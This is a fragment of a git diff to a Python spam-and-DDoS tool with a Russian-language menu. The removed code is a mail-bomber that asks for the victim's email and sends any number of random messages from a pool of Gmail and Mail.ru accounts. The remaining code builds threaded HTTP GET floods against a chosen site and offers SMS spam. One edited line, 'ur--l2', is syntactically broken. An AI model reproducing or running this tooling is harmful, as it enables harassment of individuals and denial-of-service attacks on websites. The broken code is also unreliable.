-  print (logo)
-  print ('Почта жертвы')
-  To = input ('>>>')
-  if To == "":
-    os.system('cls' if os.name=='nt' else 'clear')
-    print (logo)
-    print ('[!] Ошибка! Повтори запрос!')
-    time.sleep(2)
-    mail3()
-  else:
-    mail6()
-def mail6():
-  global N
-  os.system('cls' if os.name=='nt' else 'clear')
-  print (logo)
-  print ('Количество писем')
-  N = input ('>>>')
-  if N == "":
-    os.system('cls' if os.name=='nt' else 'clear')
-    print (logo)
-    print ('[!] Ошибка! Повтори запрос!')
-    time.sleep(2)
-    mail6()
-  else:
-    for value in range( int( N ) ):
-      global L
-      M = ""
-      T = ""
-      timemail1 = 0
-      while random.choice(timemail) >= timemail1:
-        M = M + random.choice(chars)
-        T = T + random.choice(chars)
-        timemail1 = timemail1 + 1
-      L = random.choice(Login)
-      print (L[20:24])
-      if L[20:24] == ".com":
-        U = "smtp.gmail.com"
-      if L[20:24] == ".ru" or L[20:24] == ".rus"or L[20:24] == "ru":
-        U = "smtp.mail.ru"
-      msg = MIMEMultipart()
-      msg[ 'Subject' ] = T
-      msg[ 'From' ] = L 
-      body = M
-      msg.attach( MIMEText( body, 'plain' ) )
-      server = root.SMTP_SSL( U, 465 )
-      server.login( L, P )
-      server.sendmail( L, To, msg.as_string() )
-      server.quit()
-      value += 1
-    os.system('cls' if os.name=='nt' else 'clear')
-    print (logo)
-    print ('[*] Спамер завершён')
-    print ('[1] - ВЫХОД В ГЛАВНОЕ МЕНЮ')
-    print ('[2] - ВЕРНУТСЯ В СПАМ ПОЧТЫ')
-    choose3 = input ('>>>')
-    if choose3 == '1':
-      main()
-    if choose3 == '2':
-      mail()
-    else:
-      os.system('cls' if os.name=='nt' else 'clear')
-      print (logo)
-      print ('[*] Вы автоматически перенаправлены в главное меню')
-      time.sleep(2)
-      main()
-
 def ddos():
   global threads
   global get_host
@@ -192,7 +734,7 @@ def ddos():
   global go
   global x
   threads = 800
-  get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
+  get_host = "GET " + url + " HTTP/1.1\r\nHost: " + ur--l2 + "\r\n"
   acceptall = [
   "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", 
   "Accept-Encoding: gzip, deflate\r\n", 
@@ -220,21 +762,20 @@ def main():
   os.system('cls' if os.name=='nt' else 'clear')
   print (Fore.GREEN + logo)
   try:
-      requests.get("http://google.com", verify=True)
+          requests.get("http://google.com", verify=True)
   except:
       os.system('cls' if os.name=='nt' else 'clear')
       conection()
   print ("[*] ПРОИСХОДИТ ЗАПУСК ПРОГРАММЫ!")
   time.sleep(1)
-  os.system('cls' if os.name=='nt' else 'clear')
-  print (logo)
+  clearing()
   print ('[1] - ОТКРЫТЬ СПАМЕР')
   print ('[2] - ОБНОВИТЬ СПАМЕР')
   choose = input ('>>>')
   if choose == '1':
-    openspam()
+    spam()
   if choose == '2':
-    openupdate()
+    update()
   else:
     os.system('cls' if os.name=='nt' else 'clear')
     print (logo)
@@ -242,30 +783,26 @@ def main():
     time.sleep(2)
     main()
       
-def openspam():
-  os.system('cls' if os.name=='nt' else 'clear')
-  print (logo)
-  print ('[1] - ТОЛЬКО СПАМ СМС')
-  print ('[2] - ТОЛЬКО СПАМ ПОЧТЫ')
-  print ('[3] - DDOS САЙТА')
-  print ('[4] - ВЫХОД')
+def spam():
+  clearing()
+  print ('[1] - СПАМ СМС')
+  print ('[2] - DDOS САЙТА')
+  print ('[3] - ВЫХОД')
   choose2 = input ('>>>')
   if choose2 == '1':
     sms()
   if choose2 == '2':
-    mail()
-  if choose2 == '3':
     setting()
-  if choose2 == '4':
+  if choose2 == '3':
     main()
   else:
     os.system('cls' if os.name=='nt' else 'clear')
     print (logo)
     print ('[!] Ошибка! Повтори запрос!')
     time.sleep(2)
-    openspam()
+    spam()
      
-def openupdate():
+def update():
   if os.name == 'nt':
     os.system('cls' if os.name=='nt' else 'clear')
     print (logo)
@@ -291,8 +828,7 @@ def openupdate():
     os.system("cd spammer")
     os.system("python3 install.py")
 def conection():
-  os.system('cls' if os.name=='nt' else 'clear')
-  print (logo)
+  clearing()
   print ('[!] Нет интернет соединения')
   print ('[1] - ПРОВЕРИТЬ ПОДКЛЮЧЕНИЕ')
   connect = input ('>>>')
@@ -304,11 +840,6 @@ def conection():
     print ('[!] Ошибка! Повтори запрос!')
     time.sleep(2)
     connection()
-import requests, random, time, json, colorama, os, threading, socks, socket, urllib.request, zipfile
-import smtplib as root
-from colorama import Fore, Back
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
 colorama.init()
 logo = '''
 ╔═══╦═══╗     ╔╗  ╔═══╗
